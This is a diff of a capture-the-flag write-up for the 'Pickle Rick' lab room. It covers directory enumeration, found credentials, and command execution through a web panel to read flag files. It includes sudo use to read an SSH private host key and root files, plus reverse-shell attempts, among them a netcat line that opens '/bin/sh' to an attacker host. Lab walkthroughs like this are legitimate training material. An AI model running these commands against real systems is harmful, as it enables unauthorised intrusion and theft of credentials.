@@ -2,12 +2,12 @@
 
 {% embed url="https://tryhackme.com/room/picklerick" %}
 
-When reading the source code in `http://10.10.253.172/`, we found the following username: `R1ckRul3s`.
+When reading the source code in `http://10.10.253.172/`, we found the following username: `R1ckRul3s` within the comments.
 
 ...
 
 ```bash
-gobuster dir -u ... -w ...
+gobuster dir -u ... -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 ...
 /assets
 /robots.txt
@@ -18,50 +18,64 @@ gobuster dir -u ... -w ...
 
 ...
 
-```
-$ ffuf -u http://10.10.253.172/FUZZ.php -w ...
-```
-
-...
-
-From /robots.txt:
+From `/robots.txt`:
 
 `Wubbalubbadubdub`
 
 ...
 
 ```bash
-$ nikto -h http://<target_ip> -p 80
+$ ffuf -u http://<target>/FUZZ.php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+/login.php
+/portal.php
 ...
-/login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+```
+
+...
+
+```bash
+$ ffuf -h -u http://<target>/FUZZ -w .../Apache_common.txt
+/login.php
+/portal.php
+... 
 ```
 
 We found the path `/login.php` .
 
+We are presented with a login page. We can utilize the information we have gathered earlier to discover the username and password of `R1ckRul3s` and `Wubbalubbadubdub` respectively.
 
-
-We are presented with a login page. The username and passsword are `R1ckRul3s` and `Wubbalubbadubdub`.
+**Enumerating the webpage**
 
 Comment found in `/portal.php`:
 
 `Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==`
 
-This is a string that has been base64-encoded multiple times. The plaintext value turns out to be `rabbit hole` .
+This is a string that has been base64-encoded multiple times. The plaintext value turns out to be `rabbit hole` . Well, is this a clue, or perhaps a directory path value, name of a file, or simply something just to throw us off?
 
+We are presented with a command line input that accepts commands for a Linux environment.
+
+Upon visiting `/denied.php` ,
+
+We are presented with a message: "Only the REAL rick can view this page." This made me wonder, by _REAL rick_, does this mean we have to somehow access this page via the root account?
+
+**SQL Injection attempt**
+
+I attempted a SQL injection attack on the login form, in hopes of potentially discovering the name and password combination of the root, or higher privilege account.
+
+```sql
 ...
+```
 
-_**First ingredient**_:
+### First ingredient
 
 ```bash
 $ cat Sup3rS3cretPickl3Ingred.txt # does not work
 $ more Sup3rS3cretPickl3Ingred.txt # does not work
 $ less Sup3rS3cretPickl3Ingred.txt # WORKS!
 mr. meeseek hair
-
-
 ```
 
-_**Second ingredient**_:
+### Second ingredient
 
 ```bash
 $ ls /home
@@ -72,10 +86,9 @@ second ingredients
 
 $ less '/home/rick/second ingredients' # 'more' and 'cat' disable
 1 jerry tear
-
 ```
 
-
+**Attempts at abusing my `sudo` privileges to view system logs, SSH configurations, etc.**
 
 ```bash
 $ sudo -l
@@ -94,12 +107,32 @@ $ ls -la /etc/ssh
 
 $ sudo less /etc/ssh/ssh_host_rsa_key
 ...
-```
-
-
-
-_**Third ingredient**_:
 
 ```
-$
+
+**Attempts to initiate a reverse shell**
+
+```bash
+$ perl ...
+$ ... # bash
+$ ... # python
+$ nc <attacker> [port] -e /bin/sh # netcat
+```
+
+**Attempt to add a new SSH authorized key**&#x20;
+
+```bash
+$ ...
+```
+
+### Third ingredient
+
+```bash
+$ sudo ls -la /root
+...
+3rd.txt
+...
+
+$ sudo less /root/3rd.txt
+fleeb juice
 ```
